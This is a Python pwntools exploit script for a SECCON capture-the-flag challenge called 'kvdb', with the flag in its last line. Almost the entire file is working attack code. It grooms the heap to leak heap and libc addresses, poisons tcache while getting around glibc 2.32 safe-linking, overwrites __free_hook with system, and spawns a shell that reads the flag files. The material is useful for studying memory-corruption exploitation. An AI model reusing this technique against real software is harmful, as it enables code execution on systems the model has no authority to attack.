from pwn import *

context.log_level = 'debug'
context.aslr = False
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

binary = ELF('./kvdb')
libc = ELF('./libc.so.6')  # beware of 2.32 safe-linking

IP, PORT = 'kvdb.chal.seccon.jp', 17368
DEBUG = False
if DEBUG:
    p = process(['./ld.so', './kvdb'], env={'LD_PRELOAD': './libc.so.6'})
    #p = process('./kvdb')
else:
    p = remote(IP, PORT)

def menu(sel, key):
    p.sendlineafter('> ', str(sel))
    p.sendlineafter('Key : ', key)

def put(key, data):
    menu(1, key)
    p.sendlineafter('Size : ', str(len(data)))
    p.sendafter('Data : ', data)

def get(key):
    menu(2, key)
    p.recvuntil('\n---- data ----\n')
    return p.recvuntil('\n--------------\n\n', True)

def delete(key):
    menu(3, key)
    p.recvuntil('deleted!')

def dbg():
    if DEBUG:
        gdb.attach(p, gdbscript='file ./kvdb\nx/4gx 0x15555551e000+(void*)&mp\n')
        raw_input()

def hash(s):
    h = 5381
    for c in s:
        h = (h * 33 + ord(c)) & 0xffffffff
    return h

# pre-allocate 0x30 chunks
load = ['a', 'b', 'c', 'd', 'e', 'f']  # 0xa
for c in load:
    put(c, c)
for c in load:
    delete(c)

# (cap, inuse, actual inuse)
put('a', 'a'*0x400)  # 0x90 tcached, (#1 0x800, 0x40c, 0x40c)
put('b', 'b'*0x300)  # (#1 0x800, 0x70c, 0x70c)
delete('b')  # overwrite target (#1 0x800, 0x70c, 0x40c)
put('c', 'c'*0x300)  # free #1 0x800, (#2 0x800, 0x70c, 0x70c)
delete('c')  # (#2 0x800, 0x70c, 0x40c)

# split 0x30 from #1 0x800
# consolidate #2 0x800 w/ free #1 (chunksz 0x810+0x810-0x30 == 0xff0)
put('z', 'z'*0x100)  # (#3 0x800, 0x50e, 0x50e)
delete('z')  # (#3 0x800, 0x50e, 0x40e)
delete('a')  # (#3 0x800, 0x50e, 0xe)
put('d', 'd'*0x200)  # (#3 0x800, 0x70e, 0x20e)
delete('d')  # (#3 0x800, 0x70e, 0xe)

put('e', 'e'*0x3ce) # (#4' 0x800, 0x3dc, 0x3dc)
put('d', 'd'*0x300) # (#4' 0x800, 0x6dc, 0x6dc)
delete('d')         # (#4' 0x800, 0x6dc, 0x3dc), e->data & e->size of 'd' equivalent to 'b'
put('z', 'z'*0x400) # (#5' 0x800, 0x7dc, 0x7dc)
delete('z')
delete('e')

# split 0x400 from consolidated #1 & #2 (chunk @ 0x155555556470)
put('a', 'a'*0x100) # (#4 0x400, 0x10e, 0x10e)

# b's e->data == mp.base + mp.inuse
put('f', 'f'*0x2ef)  # (#4 0x400, 0x3fd, 0x3fd)

# b @ 0x15555555685c
# top chunk @ 0x155555556880, size 0x1f391
payload  = 'b'*0x2c + p64(0x1f391)
payload  = payload.ljust(0x300, 'b')
put('b', payload)

# overwritable from 'b'
put('[', 'y')  # (#4 0x400, 0x400, 0x400)

leak = get('b')
heap = u64(leak[0x44:0x4c]) - 0x87d
log.success('heap: {:016x}'.format(heap))
assert heap & 0xfff == 0

# store the goodies aside
delete('[')  # (#4 0x400, 0x400, 0x3ff)
delete('b')

put('x1', 'x'*0xfc)   # (0x800, 0x4fe, 0x4fe)
delete('x1')          # (0x800, 0x4fe, 0x2fe)
put('x2', 'x'*0x2fd)  # (0x800, 0x7fe, 0x5fe), consolidation guard
delete('x2')          # (0x800, 0x7fe, 0x2fe)
delete('f')           # (0x800, 0x7fe, 0x10e)
put('x3', 'x'*0x2)    # (0x400, 0x801 -> 0x11b, 0x11b)
put('a', 'a'*0x2e5)   # (#4 0x400, 0x400, 0x400)

"""
0x155555556880:	0x6262626262626262	0x0000000000000031 <= [
0x155555556890:	0x0002b60000000000	0x0000000000000001
0x1555555568a0:	0x0000155555556480	0x000015555555687f
0x1555555568b0:	0x0000000000000000	0x0000000000000031
0x1555555568c0:	0x005979ee00000000	0x00000000000000fc
0x1555555568d0:	0x0000155555556490	0x0000155555556cf2
0x1555555568e0:	0x0000000000000000	0x0000000000000811 <= unsorted bin
0x1555555568f0:	0x0000155555515c00	0x0000155555515c00
"""

payload  = 'b'*0x2c + p64(0x31)
payload += p32(1) + p32(0x0002b600) + p64(8)
payload += p64(heap + 0x481) + p64(heap + 0x8f0)  # &("[\0"[1]), unsorted bin
put('b', payload)
delete('b')

put('c', 'c'*0x101)  # (0x800, 0x408, ?)
delete('x3')         # (0x800, 0x408, ?)
delete('a')          # (0x800, 0x408, ?)
put('e', 'x'*0x3f8)
delete('e')          # (0x800, 0x800, ?)
delete('c')

put('x44', '[\0')     # (#4 0x400, 0x26, 0x26)
put('a', 'a'*0x3da)   # (#4 0x400, 0x400, 0x400)
delete('a')           # (#4 0x400, 0x400, 0x26)

payload  = 'b'*0x2c + p64(0x31)
payload += p32(1) + p32(0x0002b600) + p64(8)
payload += p64(heap + 0x4a4)  # "[\0"
put('b', payload)
delete('b')

libc.address = u64(get('[')) - 0x1bec00
log.success('libc: {:016x}'.format(libc.address))
assert libc.address & 0xfff == 0

# tc #1 @ 0x155555556910
put('x5', 'x')        # (tc #1 0x200, 0x2b, 0x2b)
delete('x5')          # (tc #1 0x200, 0x2b, 0x2a)
put('c', 'c'*0x1d5)   # (tc #1 0x200, 0x200, 0x1fe)

# tc #2 @ 0x155555556b20
put('a', 'a')         # (tc #1 0x200, 0x200, 0x200)

# return to 0x400 @ 0x155555556470
put('x5', 'x')        # (#4 0x400, 0x201, 0x201)
put('x6', 'x'*0x1fc)  # (#4 0x400, 0x400, 0x400)

# preserve everything, just poison tcache 0x210
payload  = 'd'*0x2c + p64(0x31)
payload += p32(1) + p32(0x0002b600) + p64(8)
payload += p64(heap + 0x480) + p64(heap + 0x482)
payload += p64(0) + p64(0x31)
payload += p32(0) + p32(0x005979ee) + p64(0xfc)
payload += p64(heap + 0x674) + p64(heap + 0xcf2)
payload += p64(0) + p64(0x31)
payload += p32(1) + p32(0x005979f2) + p64(1)
payload += p64(heap + 0x67d) + p64(heap + 0x680)
payload += p64(0) + p64(0x211)
payload += 'c'*0x200
payload += p64(0) + p64(0x211)
payload += p64((libc.symbols['__free_hook'] - 16) ^ ((heap + 0xb30) >> 12))

put('d', payload)
delete('d')

delete('x6')  # (#4 0x400, 0x400, 0x201)
delete('c')   # (#4 0x400, 0x400, 0x2c)

assert hash('/bin/sh;n') & 0xff == 0
payload  = 'AAAAAA'
payload += p64(libc.symbols['system'])
payload += '\0'*0x40
put('/bin/sh;n', payload)

put('x7', 'x'*0x176)  # (tc #2 0x200, 0x200, 0x200)
delete('x7')

# overwrite __free_hook & prep "/bin/sh;n"
put('x8', '')

dbg()

# trigger free("/bin/sh;n")
put('x9', 'x'*0x200)

p.sendline('cat f*;cat /f*;')

p.interactive()

### SECCON{r3u53_d4ngl1ng_p01n73r5!!} ###
